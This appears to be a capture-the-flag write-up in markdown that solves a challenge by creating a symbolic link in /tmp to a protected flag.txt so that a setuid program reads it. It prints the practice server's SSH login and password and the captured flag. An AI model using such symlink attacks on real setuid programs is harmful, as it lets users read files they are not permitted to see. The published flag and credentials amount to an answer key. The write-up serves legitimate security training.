@@ -1,0 +1,86 @@
+## FLAG
+FLAG_XoK9PzskYedj/T&B
+
+It was symbolic link attack vulnerability.
+## What is symbolic link attack?
+https://www.ipa.go.jp/security/awareness/vendor/programmingv1/b07_01.html
+
+## Write ups
+
+## server info
+SSH: ctfq.sweetduet.info:10022
+ID: q13
+Pass: 8zvWx00MakSCQuGq
+##
+
+## Files in home directory (/home/q13)
+[q13@localhost ~]$ ls -la
+total 48
+drwxr-xr-x   2 root root  4096 Jun  1  2012 .
+drwxr-xr-x. 17 root root  4096 Oct  6  2014 ..
+-rw-r--r--   1 root root    18 May 11  2012 .bash_logout
+-rw-r--r--   1 root root   176 May 11  2012 .bash_profile
+-rw-r--r--   1 root root   124 May 11  2012 .bashrc
+-r--------  28 q13a q13a    22 Jun  1  2012 flag.txt
+---s--x--x  22 q13a q13a 14439 Jun  1  2012 proverb
+-r--r--r--   3 root root   755 Jun  1  2012 proverb.txt
+-r--r--r--   1 root root   151 Jun  1  2012 readme.txt
+
+[q13@localhost ~]$ file *
+flag.txt:    regular file, no read permission
+proverb:     setuid executable, regular file, no read permission
+proverb.txt: ASCII English text
+readme.txt:  ASCII English text
+
+## readme.txt
+[q13@localhost ~]$ cat readme.txt
+You are not allowed to connect internet and write the home directory.
+If you need temporary directory, use /tmp.
+Sometimes this machine will be reset.
+
+## proverb.txt is text file with many proverbs
+[q13@localhost ~]$ head -3 proverb.txt
+All's well that ends well.
+A good beginning makes a good ending.
+Many a true word is spoken in jest.
+
+## proberv is a executable program. It reads one line from file "proverb.txt" and print to stdout
+[q13@localhost ~]$ ./proverb
+A good beginning makes a good ending. 
+
+## flag.txt is the file which has flag but you don't have reading permission
+[q13@localhost ~]$ cat flag.txt
+cat: flag.txt: Permission denied
+
+## What should I do to get the flag?
+I somehow have to force "/home/q13/proverb" to read the line from "/home/q13/flag.txt"
+
+## There were some files under /tmp
+-r--r--r-- 3 root root 755 Jun  1  2012 /tmp/flag.txt
+-rw-r--r-- 2 root root 35 Jan  4 22:00 /tmp/proverb.txt
+---s--x--x 22 q13a q13a 14439 Jun  1  2012 /tmp/proverb
+
+## There was a hint in /tmp/proverb.txt
+[q13@localhost ~]$ cat /tmp/proverb.txt
+Please make your own subdirectory.
+
+## Remeber, in readme.txt, it said "If you need temporary directory, use /tmp."
+## I made my directory /tmp/tatsu
+## Move to your sub directory and create a symbolic links as below.
+ln -s ~/flag.txt /tmp/tatsu/proverb.txt
+
+[q13@localhost tatsu]$ ll
+total 0
+lrwxrwxrwx 1 q13 q13 18 Jan  4 23:55 proverb.txt -> /home/q13/flag.txt
+
+## Run the program proverb. It will read the flag from flag.txt
+[q13@localhost tatsu]$ /home/q13/proverb
+FLAG_XoK9PzskYedj/T&B
+
+## Why does this work?
+flag.txt belongs to user q13a. Only q13a (and root) has the read permission to the file.
+However, program "proverb" has suid set, which means any user can execute the program with same privilege as q13a.
+I didn't have permission to read the source code of proberv but I could guess that when program runs, it will check the presence of file named "proverb.txt" in current directory and randomly pick one line from the file and print to stdout.
+When checking the presence of "proverb.txt", program only checks the filename and doesn't care whether it is real file or just a link.
+Therefore, if you create a symbolic link named "proverb.txt" which points to "/home/q13/flag.txt" and run the program, it will redirected to "/home/q13/flag.txt". 
+Since flag.txt belongs to q13a and the program "proverb" is also running as q13a's privilege, it will read the flag from flag.txt and ouput the result to stdout. 
